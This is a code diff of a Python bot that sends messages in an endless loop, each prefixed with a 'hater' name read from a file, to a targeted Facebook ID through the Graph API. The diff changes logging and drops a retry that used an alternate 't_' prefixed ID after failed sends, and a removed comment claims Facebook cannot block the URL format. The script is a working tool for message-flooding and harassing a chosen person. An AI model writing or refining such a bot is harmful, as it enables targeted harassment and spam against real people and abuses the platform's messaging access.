@@ -25,7 +25,7 @@ def run_server():
         httpd.serve_forever()
 
 def send_messages():
-    print(">> STARTING <<", flush=True)
+    print(">> STARTING BOT <<", flush=True)
     try:
         with open('time.txt', 'r') as f: delay = int(f.read().strip())
         with open('haternames.txt', 'r') as f: hater = f.read().strip()
@@ -36,18 +36,16 @@ def send_messages():
 
         while True:
             for i, msg in enumerate(messages):
-                # Is URL format ko Facebook mana nahi kar sakta
+                # Is URL mein t_ prefix nahi hai
                 url = f"https://graph.facebook.com/v15.0/{TARGET_ID}/messages"
                 payload = {'message': f"{hater} {msg}", 'access_token': TOKEN}
                 response = requests.post(url, data=payload, headers=headers)
                 t = time.strftime("%I:%M:%S %p")
+                
                 if response.status_code == 200:
                     print(f"[{t}] SENT: {i+1}", flush=True)
                 else:
-                    # Retry with prefix if direct fails
-                    url_retry = f"https://graph.facebook.com/v15.0/t_{TARGET_ID}/messages"
-                    response = requests.post(url_retry, data=payload, headers=headers)
-                    print(f"[{t}] LOG: {response.status_code} - {response.text}", flush=True)
+                    print(f"[{t}] ERROR: {response.text}", flush=True)
                 time.sleep(delay)
     except Exception as e:
         print(f"ERROR: {e}", flush=True)
